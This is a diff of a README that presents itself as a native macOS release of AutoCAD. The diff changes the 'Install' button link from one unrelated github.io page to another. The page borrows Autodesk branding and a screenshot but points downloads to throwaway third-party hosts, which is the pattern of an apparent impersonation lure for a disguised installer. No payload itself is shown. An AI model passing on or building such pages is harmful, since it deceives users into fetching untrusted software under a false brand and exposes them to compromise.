@@ -2,7 +2,7 @@
 <h1 align="center">AutoCAD</h1>
 <p align="center">Native CAD drafting and design — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://napas-papuas.github.io/.github/autocad"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://divan-shkaf.github.io/.github/autocad"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://help.autodesk.com/cloudhelp/2025/ENU/AutoCAD-MAC-WhatsNew/images/GUID-9300A338-78AA-48DD-A107-3C38B6514C4C.png" alt="AutoCAD — macOS CAD drafting and design screenshot" width="780"/></p>
 
 ---
